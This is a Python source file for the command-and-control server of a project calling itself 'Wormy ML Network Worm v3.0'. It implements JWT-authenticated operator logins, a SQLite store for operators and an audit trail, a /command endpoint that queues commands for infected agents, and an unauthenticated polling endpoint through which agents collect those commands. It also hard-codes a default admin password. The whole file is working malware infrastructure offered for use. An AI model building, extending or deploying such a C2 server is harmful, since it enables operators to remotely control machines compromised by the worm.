"""
Wormy ML Network Worm v3.0 - Multi-Operator C2 Server
JWT authentication, role-based access, full audit trail.
"""

import base64
import hashlib
import hmac
import json
import os
import sqlite3
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer
from typing import Dict, List, Optional
from urllib.parse import parse_qs, urlparse

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from utils.logger import logger

# ── JWT (minimal, no external dep) ───────────────────────────────────────────


class JWT:
    """Minimal HS256 JWT implementation."""

    def __init__(self, secret: str):
        self.secret = secret.encode()

    def _b64url(self, data: bytes) -> str:
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

    def _b64url_decode(self, s: str) -> bytes:
        pad = 4 - len(s) % 4
        return base64.urlsafe_b64decode(s + "=" * (pad % 4))

    def encode(self, payload: Dict, expires_in: int = 3600) -> str:
        payload = {**payload, "exp": int(time.time()) + expires_in, "iat": int(time.time())}
        header = self._b64url(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
        body = self._b64url(json.dumps(payload).encode())
        sig = hmac.new(self.secret, f"{header}.{body}".encode(), hashlib.sha256).digest()
        return f"{header}.{body}.{self._b64url(sig)}"

    def decode(self, token: str) -> Optional[Dict]:
        try:
            header, body, sig = token.split(".")
            expected = hmac.new(self.secret, f"{header}.{body}".encode(), hashlib.sha256).digest()
            if not hmac.compare_digest(expected, self._b64url_decode(sig)):
                return None
            payload = json.loads(self._b64url_decode(body))
            if payload.get("exp", 0) < time.time():
                return None
            return payload
        except Exception:
            return None


# ── Operator DB ───────────────────────────────────────────────────────────────


class OperatorDB:
    """SQLite-backed store for operators, sessions, and audit log."""

    ROLES = {"admin", "operator", "viewer"}

    def __init__(self, db_path: str = "operators.db"):
        self.db_path = db_path
        self._init_db()

    def _conn(self) -> sqlite3.Connection:
        conn = sqlite3.connect(self.db_path)
        conn.row_factory = sqlite3.Row
        return conn

    def _init_db(self):
        with self._conn() as c:
            c.executescript("""
                CREATE TABLE IF NOT EXISTS operators (
                    id        INTEGER PRIMARY KEY AUTOINCREMENT,
                    username  TEXT UNIQUE NOT NULL,
                    pw_hash   TEXT NOT NULL,
                    role      TEXT NOT NULL DEFAULT 'operator',
                    active    INTEGER DEFAULT 1,
                    created   REAL
                );
                CREATE TABLE IF NOT EXISTS audit_log (
                    id        INTEGER PRIMARY KEY AUTOINCREMENT,
                    ts        REAL,
                    username  TEXT,
                    action    TEXT,
                    target    TEXT,
                    detail    TEXT,
                    ip        TEXT,
                    success   INTEGER
                );
                CREATE TABLE IF NOT EXISTS sessions (
                    token_hash TEXT PRIMARY KEY,
                    username   TEXT,
                    role       TEXT,
                    expires    REAL,
                    ip         TEXT
                );
            """)
        # Ensure default admin exists
        self.create_operator("admin", "wormy_admin_2024", "admin")

    def _hash_pw(self, password: str) -> str:
        return hashlib.pbkdf2_hmac("sha256", password.encode(), b"wormy_salt", 100_000).hex()

    def create_operator(self, username: str, password: str, role: str = "operator") -> bool:
        if role not in self.ROLES:
            return False
        try:
            with self._conn() as c:
                c.execute(
                    "INSERT OR IGNORE INTO operators "
                    "(username, pw_hash, role, created) VALUES (?,?,?,?)",
                    (username, self._hash_pw(password), role, time.time()),
                )
            return True
        except Exception as e:
            logger.debug(f"create_operator: {e}")
            return False

    def authenticate(self, username: str, password: str) -> Optional[Dict]:
        with self._conn() as c:
            row = c.execute(
                "SELECT pw_hash, role, active FROM operators WHERE username=?", (username,)
            ).fetchone()
        if not row or not row["active"]:
            return None
        if hmac.compare_digest(row["pw_hash"], self._hash_pw(password)):
            return {"username": username, "role": row["role"]}
        return None

    def log(
        self,
        username: str,
        action: str,
        target: str = None,
        detail: str = None,
        ip: str = None,
        success: bool = True,
    ):
        with self._conn() as c:
            c.execute(
                "INSERT INTO audit_log (ts, username, action, target, "
                "detail, ip, success) VALUES (?,?,?,?,?,?,?)",
                (time.time(), username, action, target, detail, ip, int(success)),
            )

    def get_audit_log(self, limit: int = 500, username: str = None) -> List[Dict]:
        with self._conn() as c:
            if username:
                rows = c.execute(
                    "SELECT * FROM audit_log WHERE username=? " "ORDER BY ts DESC LIMIT ?",
                    (username, limit),
                ).fetchall()
            else:
                rows = c.execute(
                    "SELECT * FROM audit_log ORDER BY ts DESC LIMIT ?", (limit,)
                ).fetchall()
        return [dict(r) for r in rows]

    def list_operators(self) -> List[Dict]:
        with self._conn() as c:
            rows = c.execute("SELECT id, username, role, active, created FROM operators").fetchall()
        return [dict(r) for r in rows]

    def delete_operator(self, username: str) -> bool:
        if username == "admin":
            return False
        with self._conn() as c:
            c.execute("UPDATE operators SET active=0 WHERE username=?", (username,))
        return True


# ── Multi-Operator C2 API Server ─────────────────────────────────────────────


class MultiOperatorServer:
    """
    Lightweight HTTP API for multi-operator C2 management.

    Endpoints:
      POST /auth/login          → {username, password} → JWT token
      GET  /operators           → list operators [admin]
      POST /operators/create    → create operator [admin]
      DELETE /operators/<name>  → deactivate [admin]
      GET  /audit               → full audit log [admin]
      GET  /audit/me            → own audit log [any]
      POST /command             → dispatch command to agent [operator+]
      GET  /sessions            → active sessions [admin]
    """

    ROLE_LEVELS = {"admin": 3, "operator": 2, "viewer": 1}

    def __init__(
        self,
        host: str = "0.0.0.0",
        port: int = 8444,
        jwt_secret: str = None,
        db_path: str = "operators.db",
    ):
        self.host = host
        self.port = port
        self.db = OperatorDB(db_path)
        self.jwt = JWT(jwt_secret or os.urandom(32).hex())
        self._server = None
        self._thread = None
        self._commands: Dict[str, List] = {}  # agent_id -> [pending_commands]
        self._lock = threading.Lock()

    def _require_auth(self, handler, min_role: str = "viewer") -> Optional[Dict]:
        auth = handler.headers.get("Authorization", "")
        if not auth.startswith("Bearer "):
            return None
        token = auth[7:]
        payload = self.jwt.decode(token)
        if not payload:
            return None
        role_level = self.ROLE_LEVELS.get(payload.get("role", ""), 0)
        if role_level < self.ROLE_LEVELS.get(min_role, 0):
            return None
        return payload

    def _json_response(self, handler, status: int, data: dict):
        body = json.dumps(data).encode()
        handler.send_response(status)
        handler.send_header("Content-Type", "application/json")
        handler.send_header("Content-Length", len(body))
        handler.end_headers()
        handler.wfile.write(body)

    def _read_body(self, handler) -> Optional[dict]:
        try:
            length = int(handler.headers.get("Content-Length", 0))
            if length:
                return json.loads(handler.rfile.read(length))
        except Exception:
            pass
        return {}

    def _make_handler(self):
        server_ref = self

        class Handler(BaseHTTPRequestHandler):
            def log_message(self, fmt, *args):
                pass  # suppress default httpd log

            def do_POST(self):
                self._route(method="POST")

            def do_GET(self):
                self._route(method="GET")

            def do_DELETE(self):
                self._route(method="DELETE")

            def _route(self, method):
                path = urlparse(self.path).path.rstrip("/")
                ip = self.client_address[0]

                # ── login ───────────────────────────────────────────────────
                if method == "POST" and path == "/auth/login":
                    body = server_ref._read_body(self)
                    user = body.get("username", "")
                    pw = body.get("password", "")
                    op = server_ref.db.authenticate(user, pw)
                    if op:
                        token = server_ref.jwt.encode(op, expires_in=3600)
                        server_ref.db.log(user, "login", ip=ip, success=True)
                        logger.info(f"Operator login: {user} from {ip}")
                        server_ref._json_response(
                            self,
                            200,
                            {
                                "token": token,
                                "role": op["role"],
                                "expires_in": 3600,
                            },
                        )
                    else:
                        server_ref.db.log(user, "login_fail", ip=ip, success=False)
                        server_ref._json_response(self, 401, {"error": "Invalid credentials"})

                # ── list operators ───────────────────────────────────────────
                elif method == "GET" and path == "/operators":
                    op = server_ref._require_auth(self, "admin")
                    if not op:
                        server_ref._json_response(self, 403, {"error": "Forbidden"})
                        return
                    server_ref._json_response(self, 200, server_ref.db.list_operators())

                # ── create operator ──────────────────────────────────────────
                elif method == "POST" and path == "/operators/create":
                    op = server_ref._require_auth(self, "admin")
                    if not op:
                        server_ref._json_response(self, 403, {"error": "Forbidden"})
                        return
                    body = server_ref._read_body(self)
                    ok = server_ref.db.create_operator(
                        body.get("username", ""),
                        body.get("password", ""),
                        body.get("role", "operator"),
                    )
                    server_ref.db.log(
                        op["username"],
                        "create_operator",
                        target=body.get("username"),
                        ip=ip,
                        success=ok,
                    )
                    server_ref._json_response(self, 200 if ok else 400, {"success": ok})

                # ── audit log ────────────────────────────────────────────────
                elif method == "GET" and path == "/audit":
                    op = server_ref._require_auth(self, "admin")
                    if not op:
                        server_ref._json_response(self, 403, {"error": "Forbidden"})
                        return
                    logs = server_ref.db.get_audit_log(limit=500)
                    server_ref._json_response(self, 200, {"events": logs})

                elif method == "GET" and path == "/audit/me":
                    op = server_ref._require_auth(self, "viewer")
                    if not op:
                        server_ref._json_response(self, 403, {"error": "Forbidden"})
                        return
                    logs = server_ref.db.get_audit_log(limit=200, username=op["username"])
                    server_ref._json_response(self, 200, {"events": logs})

                # ── dispatch command to agent ────────────────────────────────
                elif method == "POST" and path == "/command":
                    op = server_ref._require_auth(self, "operator")
                    if not op:
                        server_ref._json_response(self, 403, {"error": "Forbidden"})
                        return
                    body = server_ref._read_body(self)
                    agent_id = body.get("agent_id", "")
                    cmd = body.get("command", "")
                    detail = json.dumps(body)
                    with server_ref._lock:
                        server_ref._commands.setdefault(agent_id, []).append(
                            {
                                "command": cmd,
                                "params": body.get("params", {}),
                                "issued_by": op["username"],
                                "issued_at": time.time(),
                            }
                        )
                    server_ref.db.log(
                        op["username"], "command", target=agent_id, detail=detail, ip=ip
                    )
                    logger.info(f"[{op['username']}] → agent {agent_id}: {cmd}")
                    server_ref._json_response(self, 200, {"queued": True})

                # ── agent polling endpoint ───────────────────────────────────
                elif method == "GET" and path.startswith("/agent/"):
                    agent_id = path.split("/agent/", 1)[1]
                    with server_ref._lock:
                        cmds = server_ref._commands.pop(agent_id, [])
                    server_ref._json_response(self, 200, {"commands": cmds})

                else:
                    server_ref._json_response(self, 404, {"error": "Not found"})

        return Handler

    # ─── start / stop ────────────────────────────────────────────────────────

    def start(self, background: bool = True):
        handler = self._make_handler()
        self._server = HTTPServer((self.host, self.port), handler)
        logger.success(f"Multi-operator C2 API: http://{self.host}:{self.port}")
        logger.info("  Default admin credentials: admin / wormy_admin_2024")
        logger.warning("  CHANGE DEFAULT PASSWORD IMMEDIATELY IN PRODUCTION")

        if background:
            self._thread = threading.Thread(target=self._server.serve_forever, daemon=True)
            self._thread.start()
        else:
            self._server.serve_forever()

    def stop(self):
        if self._server:
            self._server.shutdown()

    def get_status(self) -> Dict:
        return {
            "host": self.host,
            "port": self.port,
            "operators": len(self.db.list_operators()),
            "running": self._thread is not None and self._thread.is_alive(),
        }
